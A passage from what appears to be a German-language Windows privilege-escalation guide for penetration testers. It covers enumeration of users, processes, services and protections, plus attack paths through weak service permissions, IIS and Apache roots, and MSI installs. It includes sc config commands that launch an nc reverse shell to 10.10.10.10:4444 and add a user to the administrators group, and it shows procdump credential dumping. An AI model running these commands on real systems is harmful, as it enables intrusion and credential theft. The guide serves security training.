  - Falls die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stellen Sie sicher, dass die Plattform auf x64 eingestellt ist.

### MSI-Installation

So führen Sie die **Installation** der schädlichen `.msi`-Datei **im Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Sicherheitslücke auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du ihnen Aufmerksamkeit schenken.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorkennwörter** und stellt sicher, dass jedes Kennwort auf einem in eine Domäne eingebundenen Computer **eindeutig, zufällig generiert und regelmäßig aktualisiert** wird. Diese Kennwörter werden sicher in Active Directory gespeichert und können nur von Benutzern mit ausreichenden Berechtigungen über ACLs abgerufen werden. So können sie lokale Administratorkennwörter einsehen, sofern sie dazu berechtigt sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Kennwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz findest du hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie pass-the-hash attacks schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldeinformationen

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldeinformationen für den Benutzer eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldeinformationen**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie zur Erweiterung deiner Berechtigungen missbrauchen kannst:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Auf der folgenden Seite erfährst du mehr über **interessante Tokens** und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Passwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe zunächst beim Auflisten der Prozesse **die Befehlszeile des Prozesses auf Passwörter**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben kannst** oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Überprüfe immer, ob [**electron/cef/chromium debuggers** laufen; du könntest sie für eine Privilegieneskalation missbrauchen](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, dem Prozessbesitzer und der Frage zu, ob ein Benutzer mit geringeren Rechten darauf zugreifen kann. Allein der Anwendungsname oder ein Debug-Flag belegt keine Codeausführung über Benutzergrenzen hinweg. Führe bei der routinemäßigen Enumeration keine aktiven Abfragen an den Debugger aus.

**Berechtigungen der Binärdateien von Prozessen prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Wenn ein geplanter Task oder Dienst Snort unter einem anderen Konto ausführt, überprüfe genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, ist der Pfad ein möglicher Ansatzpunkt für Codeausführung, sobald dieser Task oder Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Modulkompatibilität sowie mögliche deny- oder Share-Einschränkungen; ein beschreibbares Verzeichnis allein belegt keine Privilegienerweiterung. Die [Dokumentation zu Snorts dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Document Root

Vergleiche bei einer Windows-Apache-Installation den Pfad der ausführbaren Datei und das Run-as-Konto des Dienstes mit dem `DocumentRoot` in der aktiven `httpd.conf`. Überprüfe bei einem herkömmlichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des konfigurierten Document Root, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen dort Dateien erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann serverseitige Codeausführung die Privilegiengrenze des Hosts überschreiten. Bestätige, dass der Dienst läuft, dass genau dieser Pfad bereitgestellt wird und dass ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbarer Root belegt für sich genommen lediglich, dass Dateien erstellt werden können. Überprüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation kann der Dienst auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` verweisen (oder bei einem 32-Bit-Layout auf `C:\wamp\...`), wobei sich die Konfiguration daneben unter `conf\httpd.conf` und das Standard-Stammverzeichnis unter `C:\wamp64\www` oder `C:\wamp\www` befindet. Prüfen Sie gemeinsam das genaue Dienstabbild, die Identität, unter der der Dienst ausgeführt wird, das effektive `DocumentRoot` (einschließlich der Auflösung von `${INSTALL_DIR}` und Überschreibungen durch virtuelle Hosts) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt weder, dass Apache als `SYSTEM` läuft, noch, dass die eingereichte Datei ausgeführt wird. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordnen Sie bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Site/Anwendung** zu und ermitteln Sie anschließend den konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfen Sie die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Site, den Handler und pfadspezifische Überschreibungen, bevor Sie ein beschreibbares Verzeichnis als Codeausführungsmöglichkeit betrachten.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig liegt dieses unter dem jeweiligen .NET-Framework-Installationsverzeichnis in einem Verzeichnis namens `Temporary ASP.NET Files`; `<compilation tempDirectory>` in der Anwendung kann diesen Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Wenn ein Token mit geringeren Berechtigungen generierten Quellcode im Cache der **konkreten** Anwendung ändern kann, ermitteln Sie, ob diese Anwendung ihn unter einer privilegierteren [Workerprozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) neu kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Ordnen Sie den Cache der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer etwaigen Neukompilierung zu. Prüfen Sie Metadaten nur lesend; lösen Sie bei der Bestandsaufnahme keine Kompilierung aus und ändern Sie keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen üblicherweise als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über weitreichende Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerk-Anmeldedaten. Ein Pool mit `SpecificUser` verwendet stattdessen das konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität von Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Pool-Standardwerte übernehmen, die sich zwischen IIS-Versionen unterscheiden. Ermitteln Sie daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Wenn die Codeausführung einen Pool mit der Netzwerkidentität des Computerkontos erreicht, prüfen Sie die Verzeichnisberechtigungen **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte für den Domänennamenskontext; ein Ticket des Computerkontos oder die Hostrolle allein belegt diese Rechte nicht. Bei der passiven Bestandsaufnahme sollten Konfiguration und ACLs geprüft werden, ohne eine Datei hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Verfolgen Sie bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, alle aus einer Anfrage stammenden Werte durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann es ermöglichen, dass Shell-Metazeichen den Befehl verändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stellen Sie fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermitteln Sie anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des untergeordneten Prozesses. Eine lesbare Quellcodezeile, ein localhost-Listener oder eine Schwäche im Tokenformat allein belegt keine privilegierte Befehlsausführung. Prüfen Sie Quellcode und Poolkonfiguration, ohne gefälschte Anfragen zu senden oder den Hilfsprozess während der passiven Bestandsaufnahme auszuführen.

Bei einem PHP-Dienst unter Windows kann ein anfragegesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine von einem Benutzer mit geringeren Berechtigungen beschreibbare PHP-Datei unter der Identität des Workers auswerten. Vergewissern Sie sich, dass die Anfrage die betreffende Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Einbinden zulassen und der Worker tatsächlich mit höheren Berechtigungen läuft. Ein Loopback-Listener oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfen Sie Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während der passiven Bestandsaufnahme aufzurufen.

### Passwortsuche im Arbeitsspeicher

Mit **procdump** aus Sysinternals können Sie einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP halten **Anmeldedaten im Klartext im Arbeitsspeicher**. Versuchen Sie, den Arbeitsspeicher auszulesen und die Anmeldedaten zu ermitteln.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, ermöglichen möglicherweise das Starten einer CMD oder das Durchsuchen von Verzeichnissen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken Sie hier, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, in das ein Benutzer mit niedrigeren Rechten schreiben kann, überschreitet beim Import unter dem Konto des Importers eine Eingabevertrauensgrenze. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder die Aufgabe, die ihn öffnet, deren effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte XML External Entities in Projektmetadaten; eine Netzwerk-Entity unter Windows könnte eine Authentifizierung des importierenden Kontos auslösen, sofern die [Richtlinie für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zulässt. Das ist ein Ansatzpunkt für die Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei passiver Enumeration kein manipuliertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) für das Service Control Manager (SCM)-Objekt ist von den Rechten für einen vorhandenen Dienst getrennt. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanforderung](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Ansatzpunkt zur Überprüfung, aber kein Beleg dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das die bei der Erstellung angeforderten Dienstzugriffsrechte besitzt; ein späteres erneutes Öffnen des Dienstes löst eine separate Zugriffskontrolle aus und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Startkonfiguration und den ausführbaren Pfad jeweils separat. Erstellen oder starten Sie bei passiver Enumeration keinen Dienst.

Bei einem Remote-Pfad zur Dienstinstallation gleichen Sie diese SCM-Rechte mit einer Freigabe auf dem Zielsystem ab, in die derselbe Netzwerk-Logon schreiben kann, mit deren zugrunde liegender NTFS-ACL und mit einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Konto ohne Administratorrechte kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zum Ablegen der Datei gleichzeitig vorhanden sind; eine administrative Freigabe ist nicht grundsätzlich erforderlich. Schreibzugriff auf eine Freigabe allein oder ein Ansatzpunkt für das Erstellen eines Dienstes über SCM allein belegt nicht, dass der neue Dienst mit einer höheren Identität gestartet werden kann.

Ein vorhandener Dienst kann beim Start, Herunterfahren oder einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, selbst wenn diese in seinem `ImagePath` fehlt. Wird der Name der Hilfsdatei in ein Verzeichnis aufgelöst, in das ein Benutzer mit niedrigeren Rechten schreiben kann, und wird der Dienst mit einer höheren Identität ausgeführt, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Verzeichnis-Erstellungsrechte, die Dienstidentität und einen verfügbaren Lebenszyklus-Trigger. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; starten oder beenden Sie den Dienst bei einer passiven Prüfung nicht.

Bei einem vorhandenen Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) getrennt. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht einstufen. Verwendet der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad, prüfen Sie die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Verbraucher oder Loader diese Datei akzeptiert; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Erstellen Sie bei passiver Bestandsaufnahme keine Testdatei und starten Sie den Dienst nicht.

Bei einem NSClient++-Monitoring-Agenten ist eine lesbare `nsclient.ini` ein **Ansatzpunkt für eine Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und einen Trigger, der ihn unter der Dienstidentität ausführt. Auch ein ausschließlich an Loopback gebundener Listener kann für einen lokalen Benutzer erreichbar sein, doch Dateipfad, Passwort oder Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne bei passiver Enumeration Geheimnisse anzuzeigen oder die Web-API aufzurufen. Siehe [NSClient++-Dateiaufbau](https://nsclient.org/docs/concepts/file-layout/), [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis ist. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs des übergeordneten Verzeichnisses, bevor Sie die Berechtigungen des Wrappers als gesamte Dienstgrenze betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, der von dieser untergeordneten Anwendung bereitgestellt wird, ist ein separater Ansatzpunkt zur Überprüfung: Stellen Sie fest, ob der Benutzer mit niedrigeren Rechten den Listener erreichen kann, ob der genaue Vorgang seine Eingaben akzeptiert und ob die untergeordnete Dienstanwendung den unsicheren Vorgang mit einer höheren Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein belegen keine Rechteausweitung; rufen Sie bei passiver Enumeration keine Dienstvorgänge auf.

Bei einem benutzerdefinierten WCF-Vorgang verfolgen Sie eine vom Aufrufer kontrollierte Zeichenfolge bis in eine PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ein [`netTcpBinding` mit Windows-Transportzugangsdaten](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client; die Berechtigung, diesen **bestimmten** Vorgang aufzurufen, und die effektive Identität der Runspace müssen jedoch separat geprüft werden. Ein Pfad von einer Eingabe eines Aufrufers mit niedrigeren Rechten bis zu `AddScript` unter einer höheren Dienstidentität ist eine Grenze für die Codeausführung; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beleg. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Identitätswechsel-Einstellungen statisch, ohne den Endpunkt bei der Enumeration aufzurufen.

Diensttrigger ermöglichen es Windows, einen Dienst beim Eintreten bestimmter Bedingungen zu starten (Aktivität an Named-Pipe-/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Auch ohne SERVICE_START-Rechte können Sie privilegierte Dienste häufig durch Auslösen ihrer Trigger starten. Enumerations- und Aktivierungstechniken finden Sie hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-Dienst für die Diagnosesammlung

Visual Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der für die Ausführung als `LocalSystem` konfiguriert ist. Bei [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wurde ein Junction- und Object-Manager-Link-Race verwendet, um eine DACL-Zurücksetzung des Dienstes umzuleiten. Für die demonstrierte Rechteausweitung war außerdem ein nutzbarer Reparaturpfad über das Visual Studio Setup WMI Provider MSI sowie das Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 korrigiert.

Prüfen Sie bei einer passiven Triage das Konto und den Binärpfad dieses einen Dienstes, ob der Pfad zum Setup-WMI-Compiler vorhanden ist und den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegt nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Liste der Dienste abrufen:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Sie können **sc** verwenden, um Informationen zu einem Dienst abzurufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, das Binary **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Hier können Sie accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, weil er entweder deaktiviert ist oder keine aktivierten Geräte mit ihm verbunden sind._

Sie können ihn mit folgendem Befehl aktivieren.

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachten Sie, dass der Dienst upnphost für seine Funktion von SSDPSRV abhängt (bei XP SP1)**

**Eine weitere Umgehung dieses Problems** besteht darin, Folgendes auszuführen:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated users“ in einem Szenario über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So änderst du den Dienst und führst **sc** aus:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Rechte lassen sich über verschiedene Berechtigungen erweitern:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit auch die Änderung der Dienstkonfiguration.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Erbt die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Erbt ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Sicherheitslücke kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder unter einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit geringen Berechtigungen die Dienst-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Dienst oft kapern, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Dienst ausgeführten Binärdateien auflisten und deine Berechtigungen mit **icacls** prüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Suche nach gefährlichen ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Service-Executable oder das Verzeichnis, in dem sie sich befindet. Ein praktischer Abuse-Ablauf ist:<sup>[[27]](#references)</sup>

1. Bestätige das Service-Konto und den Pfad zur Executable mit `sc qc <service_name>`.
